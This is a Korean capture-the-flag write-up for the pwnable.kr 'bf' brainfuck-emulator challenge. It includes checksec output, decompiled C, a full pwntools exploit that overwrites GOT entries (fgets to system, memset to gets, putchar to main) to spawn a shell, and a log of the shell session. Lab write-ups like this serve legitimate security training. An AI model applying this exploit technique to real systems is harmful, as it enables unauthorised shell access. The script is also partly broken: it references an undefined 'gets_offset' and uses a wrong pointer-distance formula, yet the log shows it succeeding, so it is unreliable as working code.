# 문제  
I made a simple brain-fuck language emulation program written in C. 
The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
Find a bug and exploit it to get a shell. 

Download : http://pwnable.kr/bin/bf
Download : http://pwnable.kr/bin/bf_libc.so

Running at : nc pwnable.kr 9001  

---
# 개요

문제를 해석해보면, 간단한 brain-fuck 언어 에뮬레이션 프로그램을 C언어로 작성하였는데, [ ]안에 들어갈 명령어를 아직 구현하지 못했다고 합니다. 그래서 버그를 찾아서 쉘을 획득하려고 한다고 합니다. 문제 풀이를 위해 바이너리 파일과 해당 바이너리파일에서 참조하는 libc 파일을 제공한다. 먼저 checksec 명령어를 사용하여 해당 바이너리에 어떤 mitigation 이 존재하는지 확인합니다.

```
secretpack@ubuntu:~/Desktop$ pwn checksec bf
[*] '/home/secretpack/Desktop/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

NX가 Enable 이기 때문에 Shellcode 는 사용하지 못하나, Partial RELRO 이기 때문에 got overwrite 는 가능할 것으로 파악됩니다. 이제 IDA로 정적분석을 시도합니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // edx@4
  size_t i; // [sp+28h] [bp-40Ch]@1
  int v6; // [sp+2Ch] [bp-408h]@1
  int v7; // [sp+42Ch] [bp-8h]@1

  v7 = *MK_FP(__GS__, 20);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(&v6, 0, 0x400u);
  fgets((char *)&v6, 1024, stdin);
  for ( i = 0; i < strlen((const char *)&v6); ++i )
    do_brainfuck(*((_BYTE *)&v6 + i));
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```

main 함수를 디컴파일 한 결과입니다. ```fgets()``` 로 1024(0x400)byte 만큼 입력을 받고, ```do_brainfuck()``` 함수가 호출되어, 한바이트씩 각자의 로직이 수행됩니다. 그리고 전역변수 ```p```에 전역변수 ```tape```의 주소값이 들어갑니다. 이제 ```do_brainfuck()``` 함수를 살펴봅시다.  

```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax@1
  _BYTE *v2; // ebx@7

  result = a1;
  switch ( a1 )
  {
    case 62:
      result = p++ + 1;
      break;
    case 60:
      result = p-- - 1;
      break;
    case 43:
      result = p;
      ++*(_BYTE *)p;
      break;
    case 45:
      result = p;
      --*(_BYTE *)p;
      break;
    case 46:
      result = putchar(*(_BYTE *)p);
      break;
    case 44:
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case 91:
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

위의 코드를 봤을 때 유효한 코드는 총 6개이며 정리하면 아래와 같습니다.  
* '+' = ++*p
* ',' = *p = ```getchar()```
* '-' = --*p
* '.' = ```putchar(*p)```
* '<' = p -= 1
* '>' = p += 1

---
# 분석

Partial RELRO 이므로 got Overwrite 가 가능합니다. 따라서 libc leak을 수행한 뒤 ```memset@got``` 를 ```gets()```로 변경하고, ```fgets@got```를 ```system()```으로 변경한다, 마지막으로 ```putchar@got```를 ```main()``` 으로 변경하면, ```do_brainfuck()``` 함수에서 다시 ```main()```함수로 돌아와 ```gets()``` 함수로 입력받을 때, "/bin/sh" 를 입력한다면 쉘을 획득할 수 있을 것입니다. 해당 내용을 바탕으로 exploit code를 작성합니다.  
```python
from pwn import*

p = remote("pwnable.kr", 9001)
elf = ELF("./bf")
libc = ELF("bf_libc.so")

main_addr = elf.symbols['main']
fgets_got = elf.got['fgets']
memset_got = elf.got['memset']
putchar_got = elf.got['putchar']

offset_fgets = libc.symbols['fgets']
offset_gets = libc.symbols['gets']
offset_system = libc.symbols['system']

'''
.bss:0804A080 p               dd ?                    ; DATA XREF: do_brainfuck:loc_80485FEr
.bss:0804A080                                         ; do_brainfuck+2Aw ...
.bss:0804A084                 align 20h
.bss:0804A0A0 tape            db    ? ;               ; DATA XREF: main+6Do
'''

p_addr = 0x804a080
tape_addr = 0x804a0a0
binsh = "/bin/sh\0"

#1. libc leak

if tape_addr > fgets_got:
    payload = "<" * (tape_addr - fgets_got)
else:
    payload = ">" * (tape_addr + fgets_got)

payload += ".>" * 4
payload += "<" * 4

#2. overwrite fgets@got -> system

payload += ",>" * 4
payload += "<" * 4

#3. overwrite memset@got -> gets

if fgets_got > memset_got:
    payload += "<" * (fgets_got - memset_got)
else:
    payload += ">" * (memset_got - fgets_got)

payload += ",>" * 4
payload += "<" * 4

#4. overwrite putchar@got -> main

if memset_got > putchar_got:
    payload += "<" * (memset_got - putchar_got)
else:
    payload += ">" * (putchar_got - memset_got)

payload += ",>" * 4
payload += "<" * 4

payload += "."
p.sendlineafter("[]\n", payload)

sleep(2)

fgets_addr = u32(p.recv())
libc_base = fgets_addr - offset_fgets
system_addr = libc_base + offset_system
gets_addr = libc_base + gets_offset

p.send(p32(system_addr))
p.send(p32(gets_addr))
p.send(p32(main_addr))

p.sendlineafter("[]\n", binsh)

p.interactive()

```
```
secretpack@ubuntu:~/Desktop$ python3 bf.py
[+] Opening connection to pwnable.kr on port 9001: Done
[*] '/home/secretpack/Desktop/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/home/secretpack/Desktop/bf_libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ 
$ ls
brainfuck
flag
libc-2.23.so
log
super.pl
$ cat flag
#############################
```